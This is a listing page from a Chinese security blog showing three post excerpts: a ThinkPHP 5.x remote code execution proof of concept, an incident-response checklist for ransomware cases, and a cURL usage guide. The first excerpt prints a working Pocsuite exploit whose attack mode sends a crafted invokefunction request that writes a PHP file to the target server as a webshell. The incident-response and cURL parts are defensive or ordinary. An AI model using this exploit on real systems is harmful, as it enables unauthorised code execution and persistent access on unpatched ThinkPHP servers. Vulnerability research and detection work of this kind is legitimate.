+------------------------+----------------+--------+-----------+-------------------------+---------+
success : 1 / 1

[*] shutting down at 21\:04\:22
</span></code></pre></div></div>

<p>可批量验证：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
usage: pocsuite <span class="o">[</span>options]

optional arguments:
  <span class="nt">-h</span>, <span class="nt">--help</span>            Show <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">--version</span>             Show program<span class="s1">'s version number and exit
  --update              Update Pocsuite

target:
  -u URL, --url URL     Target URL (e.g. "http://www.targetsite.com/")
  -f URLFILE, --file URLFILE
                        Scan multiple targets given in a textual file
  -r POCFILE            Load POC from a file (e.g. "_0001_cms_sql_inj.py") or directory (e.g. "modules/")

mode:
  --verify              Run poc with verify mode
  --attack              Run poc with attack mode
...
</span></code></pre></div></div>

<h2 id="0x03-poc代码">0x03 POC代码</h2>

<p><a href="https://github.com/Cooolis/Pocsuite/blob/dev/modules/thinkphpv5_rce.py">https://github.com/Cooolis/Pocsuite/blob/dev/modules/thinkphpv5_rce.py</a></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
# coding: utf-8
</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">pocsuite.api.request</span> <span class="kn">import</span> <span class="n">req</span>
<span class="kn">from</span> <span class="nn">pocsuite.api.poc</span> <span class="kn">import</span> <span class="n">register</span>
<span class="kn">from</span> <span class="nn">pocsuite.api.poc</span> <span class="kn">import</span> <span class="n">Output</span><span class="p">,</span> <span class="n">POCBase</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">OrderedDict</span>


<span class="k">class</span> <span class="nc">ThinkPHP</span><span class="p">(</span><span class="n">POCBase</span><span class="p">):</span>
    <span class="n">vulID</span> <span class="o">=</span> <span class="s">'1024'</span>
    <span class="n">version</span> <span class="o">=</span> <span class="s">'1'</span>
    <span class="n">author</span> <span class="o">=</span> <span class="s">'倾旋 rvn0sxy@gmail.com'</span>
    <span class="n">vulDate</span> <span class="o">=</span> <span class="s">'2018-12-10'</span>
    <span class="n">createDate</span> <span class="o">=</span> <span class="s">'2018-12-11'</span>
    <span class="n">updateDate</span> <span class="o">=</span> <span class="s">'2018-12-11'</span>
    <span class="n">references</span> <span class="o">=</span> <span class="p">[</span><span class="s">'https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ'</span><span class="p">]</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">'Thinkphp 5.x &lt; 5.1.31, &lt;= 5.0.23 远程代码执行'</span>
    <span class="n">appPowerLink</span> <span class="o">=</span> <span class="s">'https://www.thinkphp.cn/'</span>
    <span class="n">appName</span> <span class="o">=</span> <span class="s">'Thinkphp'</span>
    <span class="n">appVersion</span> <span class="o">=</span> <span class="s">'5.x &lt; 5.1.31, &lt;= 5.0.23'</span>
    <span class="n">vulType</span> <span class="o">=</span> <span class="s">'Remote code Execute'</span>
    <span class="n">desc</span> <span class="o">=</span> <span class="s">'近日thinkphp团队发布了版本更新https://blog.thinkphp.cn/869075，其中修复了一处getshell漏洞。'</span>
    <span class="n">samples</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">def</span> <span class="nf">_attack</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
            <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
            <span class="n">shell_name</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span><span class="o">+</span><span class="s">'.php'</span>
            <span class="n">shell_code</span> <span class="o">=</span> <span class="s">'&lt;?php phpinfo();?&gt;'</span>
            <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8081"</span>
            <span class="p">}</span>
            <span class="n">vul_url</span> <span class="o">=</span> <span class="s">'%s/?s=index/</span><span class="se">\\</span><span class="s">think</span><span class="se">\\</span><span class="s">app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=%s&amp;vars[1][]=%s'</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">,</span><span class="n">shell_name</span><span class="p">,</span><span class="n">shell_code</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">_verify</span><span class="p">(</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">parse_attack</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">vul_url</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shell_code</span><span class="p">))</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">:</span>
                <span class="n">result</span><span class="p">[</span><span class="s">'webshell'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="o">+</span><span class="n">shell_name</span>
            <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">parse_attack</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
            <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
            <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s">"http"</span><span class="p">:</span><span class="s">"http://127.0.0.1:8081"</span>
            <span class="p">}</span>
            <span class="n">vul_url</span> <span class="o">=</span> <span class="s">'%s/?s=index/</span><span class="se">\\</span><span class="s">think</span><span class="se">\\</span><span class="s">app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=header&amp;vars[1][]=vuln:1'</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">url</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">vul_url</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">).</span><span class="n">headers</span>
            <span class="k">if</span> <span class="s">'vuln'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
                <span class="n">result</span><span class="p">[</span><span class="s">'VerifyInfo'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
                <span class="n">result</span><span class="p">[</span><span class="s">'VerifyInfo'</span><span class="p">][</span><span class="s">'URL'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">url</span>
            <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">parse_attack</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">parse_attack</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">Output</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
                <span class="n">output</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">output</span><span class="p">.</span><span class="n">fail</span><span class="p">(</span><span class="s">"No ... "</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">output</span>


<span class="n">register</span><span class="p">(</span><span class="n">ThinkPHP</span><span class="p">)</span>
</code></pre></div></div>

<p>关于POC的使用，可参考<a href="http://pocsuite.org">pocsuite.org</a></p>

<h2 id="0x04-修复">0x04 修复</h2>

<p>参考：<a href="https://blog.thinkphp.cn/869075">https://blog.thinkphp.cn/869075</a></p>

--&gt;
          <!---->
          近日thinkphp团队发布了版本更新https://blog.thinkphp.cn/869075，其中修复了一处getshell漏洞。
          <p>
            <a class="post-link" href="/archivers/2018-12-05/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-06/1">应急响应 近期总结</a>
        </h2>
        
        <div class="post-meta">Dec 5, 2018</div>

        <div class="post-excerpt">
          （依据是什么）？
  <li>什么时候发现的？</li>
  <li>目前是否有做物理隔离（断网）？</li>
  <li>受害机器是哪个？</li>
  <li>受害服务有几台？（1台/N台）</li>
  <li>最先发现是哪台？</li>
  <li>这台服务器对外有哪些服务？</li>
  <li>这台服务器于其他机器是否处于同一个内网？</li>


<h3 id="how-to-do">How to do</h3>

<ol>
  <li>查看进程列表</li>
  <li>查看进程创建Command Line</li>
  <li>查看网络连接状况</li>
  <li>校验进程、模块签名</li>
  <li>查看进程线程、子进程</li>
  <li>查看是否有开机启动项，与现场工作人员确认</li>
  <li>查看勒索提示文件创建时间</li>
  <li>查看服务器账户是否正常</li>
  <li>查看日志是否被清除</li>
  <li>查看认证日志</li>
</ol>

<p>查看进程列表：能够确定是否有木马、病毒还在运行，较为可疑的就是：powershell.exe、rundll32、regsvr32、cmd…</p>

<p>查看进程创建Command Line：能够查看某些进程的执行路径是否正常、进程名是否是伪装的。</p>

<p>查看网络连接状况：确认机器是否还在被控状态，根据连接状况可以定位到程序路径。</p>

<p>校验进程、模块签名：有些病毒、木马会劫持操作系统的dll达到持久控制，通过校验签名可以确定文件是否是操作系统本身的。</p>

<p>查看是否有开机启动项，与现场工作人员确认：现场服务器上的业务可能需要定时任务计划或者开机启动项，需要确认启动项是否存在敏感行为，系统启动项和定时任务是木马常用来持久控制的一种手段。</p>

<p>查看勒索提示文件创建时间：这个信息虽然不准确，但是可以基本确定勒索病毒的活跃时间，同时根据勒索文件去查询对应的IOC信息。</p>

<p>查看服务器账户是否正常：在服务器上添加隐藏账户也是持久控制的一种方式。</p>

<p>查看日志是否被清除：判断日志清除时间，尽最大努力还原事件原委。</p>

<p>查看认证日志：一般针对SMB和RDP服务，如果发现某个IP在2秒内登录&gt;3次，基本上是不正常的，一般病毒横向移动时，爆破的行为间隔时间非常短。</p>

<h3 id="0x09-应急响应---常用工具">0x09 应急响应 - 常用工具</h3>

<ul>
  <li><a href="http://www.xuetr.com/download/PCHunter_free.zip">PC-Hunter</a></li>
  <li><a href="https://download.sysinternals.com/files/Procdump.zip">Procdump</a></li>
  <li><a href="https://github.com/Microsoft/ProcDump-for-Linux">Procdump for Linux</a></li>
  <li><a href="https://processhacker.sourceforge.io/downloads.php">ProcessHacker</a></li>
  <li><a href="https://download.sysinternals.com/files/ProcessExplorer.zip">ProcessExplorer</a></li>
  <li><a href="https://download.sysinternals.com/files/ProcessMonitor.zip">ProcessMonitor</a></li>
  <li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a></li>
  <li><a href="https://download.sysinternals.com/files/TCPView.zip">TCPView</a></li>
  <li><a href="https://download.sysinternals.com/files/PortMon.zip">Portmon</a></li>
</ul>

--&gt;
          总结一下近期做的一些应急响应心得
          <p>
            <a class="post-link" href="/archivers/2018-12-06/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-03/2">cURL工具的使用技巧</a>
        </h2>
        
        <div class="post-meta">Dec 3, 2018</div>

        <div class="post-excerpt">
          <!--<blockquote>
  <p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。 
– Baidu</p>
</blockquote>

<ul id="markdown-toc">
  <li><a href="#0x01-curl支持的协议" id="markdown-toc-0x01-curl支持的协议">0x01 cURL支持的协议</a></li>
  <li><a href="#0x02-常用选项" id="markdown-toc-0x02-常用选项">0x02 常用选项</a></li>
  <li><a href="#0x03-认证" id="markdown-toc-0x03-认证">0x03 认证</a></li>
  <li><a href="#0x04-任意http方法" id="markdown-toc-0x04-任意http方法">0x04 任意HTTP方法</a></li>
  <li><a href="#0x04-上传文件" id="markdown-toc-0x04-上传文件">0x04 上传文件</a></li>
  <li><a href="#0x05-网卡" id="markdown-toc-0x05-网卡">0x05 网卡</a></li>
  <li><a href="#0x06-指定源端口" id="markdown-toc-0x06-指定源端口">0x06 指定源端口</a></li>
  <li><a href="#0x07-代理" id="markdown-toc-0x07-代理">0x07 代理</a>    <ul>
      <li><a href="#代理认证" id="markdown-toc-代理认证">代理认证</a></li>
    </ul>
  </li>
  <li><a href="#0x08-html表单上传文件" id="markdown-toc-0x08-html表单上传文件">0x08 HTML表单上传文件</a></li>
  <li><a href="#0x09-cookie" id="markdown-toc-0x09-cookie">0x09 COOKIE</a>    <ul>
      <li><a href="#读取cookie" id="markdown-toc-读取cookie">读取cookie</a></li>
      <li><a href="#将cookie写入文件" id="markdown-toc-将cookie写入文件">将cookie写入文件</a></li>
    </ul>
  </li>
  <li><a href="#ref" id="markdown-toc-ref">REF</a></li>
</ul>

<h2 id="0x01-curl支持的协议">0x01 cURL支持的协议</h2>

<p>DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET, TFTP</p>

<p>Ref:https://ec.haxx.se/protocols-curl.html</p>

<h2 id="0x02-常用选项">0x02 常用选项</h2>

<ul>
  <li>查看详细信息：<code class="language-plaintext highlighter-rouge">curl -v http://example.com</code></li>
  <li>跟随重定向： <code class="language-plaintext highlighter-rouge">curl -L http://example.com</code></li>
  <li>发送POST数据：<code class="language-plaintext highlighter-rouge">curl -d "username=Rvn0xsy" http://example.com</code></li>
  <li>下载文件：<code class="language-plaintext highlighter-rouge">curl -o ~/Download/down.zip http://example.com/download.zip</code></li>
  <li>查看进度表： <code class="language-plaintext highlighter-rouge">curl -s -o ~/Download/down.zip http://example.com/download.zip</code></li>
  <li>下载并覆盖本地副本：<code class="language-plaintext highlighter-rouge">curl -O ~/Download/down.zip http://example.com/download.zip</code></li>
  <li>限速：<code class="language-plaintext highlighter-rouge">curl http://example.com/ --limit-rate 200K</code></li>
  <li>最大文件大小：<code class="language-plaintext highlighter-rouge">curl --max-filesize 100000 http://example.com/</code></li>
  <li>偏移读取：<code class="language-plaintext highlighter-rouge">curl --range 100-1099 http://example.com/download.zip</code></li>
  <li>URL编码：<code class="language-plaintext highlighter-rouge">curl --data-urlencode "name=John Doe (Junior)" http://example.com</code></li>
  <li>URL编码-从文件读取：<code class="language-plaintext highlighter-rouge">curl --data-urlencode user@contents.txt http://example.com #user的内容再contents.txt中</code></li>
  <li>GET请求：<code class="language-plaintext highlighter-rouge">curl -G http://example.com</code></li>
  <li>添加请求头：<code class="language-plaintext highlighter-rouge">curl -H "Transfer-Encoding: chunked" http://example.com</code></li>
  <li>自定义user-agent：<code class="language-plaintext highlighter-rouge">curl --user-agent/-A/-H 'User-Agent: http://example.com'</code></li>
</ul>

<h2 id="0x03-认证">0x03 认证</h2>

<p>cURL支持四种认证：</p>

<ul>
  <li>–digest</li>
  <li>–negotiate</li>
  <li>–ntlm</li>
  <li><code class="language-plaintext highlighter-rouge">-u &lt;username:password&gt;</code></li>
</ul>

<h2 id="0x04-任意http方法">0x04 任意HTTP方法</h2>

<p><code class="language-plaintext highlighter-rouge">cURL -X &lt;POST/GET/OPTIONS/PUT&gt; http://example.com</code></p>

<h2 id="0x04-上传文件">0x04 上传文件</h2>

<p>支持：FILE, FTP, FTPS, HTTP, HTTPS, IMAP, IMAPS, SCP, SFTP, SMB, SMBS, SMTP, SMTPS and TFTP.</p>

<p>HTTP：<code class="language-plaintext highlighter-rouge">curl -T upload.zip http://example.com/ # PUT</code></p>

<p>FTP：<code class="language-plaintext highlighter-rouge">curl -T upload.zip ftp://example.com/</code></p>

<p>SMTP：<code class="language-plaintext highlighter-rouge">curl -T mail smtp://mail.example.com/ --mail-from user@example.com</code></p>

<h2 id="0x05-网卡">0x05 网卡</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --interface eth1 https://www.example.com/

curl --interface 192.168.0.2 https://www.example.com/

curl --interface machine2 https://www.example.com/
</code></pre></div></div>

<h2 id="0x06-指定源端口">0x06 指定源端口</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --local-port 4000-4200 https://example.com/
</code></pre></div></div>

<h2 id="0x07-代理">0x07 代理</h2>

<p>支持代理：</p>

<ul>
  <li>http</li>
  <li>socks</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -x 192.168.0.1:8080 http:/example.com/
curl -x socks4://proxy.example.com http://www.example.com/
curl --socks4 proxy.example.com http://www.example.com/
curl --socks4a proxy.example.com http://www.example.com/
curl -x socks4a://proxy.example.com http://www.example.com/
curl -x socks5://proxy.example.com http://www.example.com/
curl --socks5 proxy.example.com http://www.example.com/
curl -x socks5h://proxy.example.com http://www.example.com/
curl --socks5-hostname proxy.example.com http://www.example.com/
</code></pre></div></div>

<h3 id="代理认证">代理认证</h3>

<p><code class="language-plaintext highlighter-rouge">curl -U daniel:secr3t -x myproxy:80 http://example.com</code></p>

<h2 id="0x08-html表单上传文件">0x08 HTML表单上传文件</h2>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"submit.cgi"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
   Name: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"person"</span><span class="nt">&gt;&lt;br&gt;</span>
   File: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"secret"</span><span class="nt">&gt;&lt;br&gt;</span>
   <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span> 
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">curl -F person=anonymous -F secret=@file.txt http://example.com/submit.cgi</code></p>

<h2 id="0x09-cookie">0x09 COOKIE</h2>

<h3 id="读取cookie">读取cookie</h3>

<p><code class="language-plaintext highlighter-rouge">curl -L -b cookies.txt http://example.com</code></p>

<h3 id="将cookie写入文件">将cookie写入文件</h3>

<p><code class="language-plaintext highlighter-rouge">curl -c cookie-jar.txt http://example.com</code></p>

<h2 id="ref">REF</h2>

<ul>
  <li>https://legacy.gitbook.com/book/bagder/everything-curl</li>
</ul>
-->
          curl工具的使用技巧
          <p>
            <a class="post-link" href="/archivers/2018-12-03/2">Read More »</a>
          </p>
        </div>
      </li>
    
  </ul>
  
  <!-- Pagination links -->
<div class="pagination">
  
    <a href="/page14" class="previous">PREV</a>
  
  <span class="page_number ">15 of 34</span>
  
    <a href="/page16" class="next">NEXT</a>
  
</div>

</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
